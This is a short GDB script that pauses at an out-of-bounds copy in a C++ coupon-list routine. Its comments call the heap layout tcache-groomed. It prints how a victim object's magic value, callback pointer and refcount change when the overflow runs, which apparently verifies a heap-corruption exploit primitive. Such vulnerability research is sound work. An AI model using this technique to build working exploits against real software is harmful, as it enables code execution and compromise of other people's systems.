# Freeze at the pinned OOB copy site of the tcache-groomed consumer and show
# the real address relationship between the coupon vector and the live victim.
set pagination off
set confirm off
break CouponList-internal.hpp:116
run
printf "GDB_COPY_SITE\n"
set $p = (unsigned char*) sketch->coupons_._M_impl._M_start
printf "GDB_P=%p GDB_G=%p GDB_V=%p\n", $p, g_G, g_V
printf "GDB_DELTA_V=%ld GDB_VCHUNK_BEFORE=%#lx\n", (long)((char*)g_V - (char*)$p), *(unsigned long*)($p + 40)
printf "GDB_VMAGIC_BEFORE=%016lx GDB_VCB_BEFORE=%p\n", g_V->magic, g_V->callback
next
printf "GDB_VCHUNK_AFTER=%#lx GDB_VMAGIC_AFTER=%016lx\n", *(unsigned long*)($p + 40), g_V->magic
printf "GDB_VCB_AFTER=%p GDB_VREF_AFTER=%016lx\n", g_V->callback, g_V->refcount
continue
printf "GDB_DONE\n"
